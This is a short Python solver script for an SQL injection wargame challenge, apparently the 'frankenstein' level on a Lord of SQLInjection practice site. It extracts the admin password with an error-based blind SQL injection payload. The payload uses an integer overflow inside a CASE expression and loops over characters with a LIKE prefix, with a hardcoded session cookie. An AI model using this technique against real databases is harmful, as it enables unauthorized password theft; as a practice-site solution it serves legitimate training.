import requests

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
cookies = { "PHPSESSID" : "s43pedsgqi7j01ghlr4ov1i179" }

def pw_crack():
    password = ''
    loop = True

    while loop:
        for j in range(30, 80):
            params = { "pw" : "' or case when id='admin' and pw like '{}{}%' then ~0 + 1 else 1 end #".format(password, chr(int(str(j), 16))) }
            request = requests.get(url, params=params, cookies=cookies)

            if "<br>error" in request.text:
                password = password + chr(int(str(j), 16)).lower()
                print("패스워드:", password)
                break

            if j == 79:
                loop = False
                break

pw_crack()
